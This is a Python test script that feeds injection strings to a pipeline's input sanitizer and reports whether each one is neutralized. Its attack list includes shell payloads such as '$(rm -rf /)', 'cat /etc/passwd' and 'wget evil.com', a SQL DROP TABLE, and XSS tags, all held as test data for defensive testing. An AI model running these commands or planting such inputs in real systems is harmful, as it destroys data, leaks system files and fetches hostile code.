#!/usr/bin/env python3
"""
Quick test for input sanitization.
"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from developer.forge.pipeline import Pipeline
from developer.forge.regime import Regime, RegimeType

p = Pipeline(Regime.from_type(RegimeType.FACTUAL))

# Test injection attacks
attacks = [
    # Shell injection
    ("$(rm -rf /)", "shell_command_substitution"),
    ("`whoami`", "shell_backtick"),
    ("query; DROP TABLE users", "shell_semicolon"),
    ("test | cat /etc/passwd", "shell_pipe"),
    ("data & wget evil.com", "shell_background"),
    
    # HTML/XSS
    ("<script>alert('xss')</script>", "xss_script"),
    ("<img onerror=alert(1) src=x>", "xss_img_tag"),
    
    # Control characters
    ("line1\nline2", "newline_injection"),
    ("text\roverwrite", "carriage_return"),
    
    # Length bomb
    ("a" * 2000, "length_bomb"),
]

print("=" * 70)
print("INPUT SANITIZATION TEST")
print("=" * 70)

all_passed = True

for attack, name in attacks:
    sanitized = p._sanitize_input(attack)
    
    # Check what was neutralized
    has_dollar = '$' in sanitized
    has_backtick = '`' in sanitized
    has_semicolon = ';' in sanitized
    has_pipe = '|' in sanitized
    has_amp = '&' in sanitized
    has_lt = '<' in sanitized
    has_gt = '>' in sanitized
    has_newline = '\n' in sanitized
    has_cr = '\r' in sanitized
    too_long = len(sanitized) > 1000
    
    # Determine if safe
    dangerous = any([
        has_dollar, has_backtick, has_semicolon, has_pipe, has_amp,
        has_lt, has_gt, has_newline, has_cr, too_long
    ])
    
    status = "✗ UNSAFE" if dangerous else "✓ SAFE"
    all_passed = all_passed and not dangerous
    
    print(f"\n{status} [{name}]")
    print(f"  IN:  {repr(attack[:60])}")
    print(f"  OUT: {repr(sanitized[:60])}")
    if too_long:
        print(f"  (truncated to {len(sanitized)} chars)")

print("\n" + "=" * 70)
if all_passed:
    print("ALL INJECTION ATTACKS NEUTRALIZED ✓")
else:
    print("SOME ATTACKS NOT NEUTRALIZED ✗")
print("=" * 70)
